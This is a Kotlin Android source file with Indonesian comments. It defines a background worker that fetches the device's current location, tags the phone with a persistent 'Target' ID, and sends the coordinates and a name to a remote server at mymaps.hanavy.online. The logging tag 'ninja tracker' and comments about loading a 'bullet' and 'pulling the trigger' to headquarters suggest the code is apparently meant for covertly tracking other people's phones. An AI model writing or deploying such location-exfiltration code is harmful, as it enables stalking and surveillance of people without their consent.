package com.hanafi.han

import android.annotation.SuppressLint
import android.content.Context
import android.util.Log
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.Priority
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.tasks.await
import kotlinx.coroutines.withContext
import java.net.HttpURLConnection
import java.net.URL

class LocationWorker(appContext: Context, workerParams: WorkerParameters) : CoroutineWorker(appContext, workerParams) {

    @SuppressLint("MissingPermission")
    override suspend fun doWork(): Result {
        return try {
            val fusedLocationClient = LocationServices.getFusedLocationProviderClient(applicationContext)
            
            // Mengambil lokasi (akurasi seimbang agar hemat baterai)
            val location = fusedLocationClient.getCurrentLocation(Priority.PRIORITY_BALANCED_POWER_ACCURACY, null).await()

            if (location != null) {
                val latitude = location.latitude
                val longitude = location.longitude
                
                Log.d("PelacakNinja", "Lokasi Ditemukan: $latitude, $longitude")

                // Kirim ke server
                kirimKeServer(latitude, longitude)
            }

            Result.success()
        } catch (e: Exception) {
            Log.e("PelacakNinja", "Gagal mengambil lokasi: ${e.message}")
            Result.retry() // Coba lagi nanti jika gagal
        }
    }

    private suspend fun kirimKeServer(lat: Double, lon: Double) {
        withContext(Dispatchers.IO) {
            try {
                // 1. Membaca "Brankas Lokal" di HP untuk mencari ID dan Nama
                val sharedPref = applicationContext.getSharedPreferences("PelacakPrefs", Context.MODE_PRIVATE)

                // 2. Cek apakah HP ini sudah punya ID Permanen?
                var targetId = sharedPref.getString("id_target", null)
                if (targetId == null) {
                    // Jika belum punya, buatkan ID acak dan simpan permanen
                    val idAcak = java.util.UUID.randomUUID().toString().substring(0, 4).uppercase()
                    targetId = "Target_$idAcak"
                    sharedPref.edit().putString("id_target", targetId).apply()
                }

                // 3. Ambil nama dari inputan (jika kosong, gunakan ID target tadi)
                var targetNama = sharedPref.getString("nama_input", "")
                if (targetNama.isNullOrEmpty()) {
                    targetNama = targetId
                }

                // 4. Enkripsi nama agar aman dikirim lewat URL (menghindari error karena spasi)
                val namaAman = java.net.URLEncoder.encode(targetNama ?: "Anonim", "UTF-8")

                // 5. Merakit peluru (URL Tembakan Baru)
                val urlServer = "https://mymaps.hanavy.online/api/update?id=$targetId&nama=$namaAman&lat=$lat&lon=$lon"
                val url = URL(urlServer)
                
                // === 6. TARIK PELATUKNYA DI SINI! (Kirim ke Vercel) ===
                val connection = url.openConnection() as HttpURLConnection
                connection.requestMethod = "GET"
                connection.connectTimeout = 5000 // Batas waktu tunggu 5 detik
                
                val responseCode = connection.responseCode
                Log.d("PelacakNinja", "Status Tembakan ke Markas: $responseCode")
                
                connection.disconnect()
                // ===================================================

            } catch (e: Exception) {
                Log.e("PelacakNinja", "Gagal mengirim ke server: ${e.message}")
            }
        }
    }
}